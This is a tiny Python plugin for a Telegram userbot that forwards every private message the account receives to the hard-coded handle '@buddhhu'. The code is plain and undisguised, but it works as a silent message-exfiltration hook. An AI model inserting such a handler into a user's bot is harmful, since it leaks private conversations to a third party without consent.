@borg.on(events.NewMessage(func=lambda e: e.is_private))
async def fwd_to_me(event):
	await event.forward_to("@buddhhu")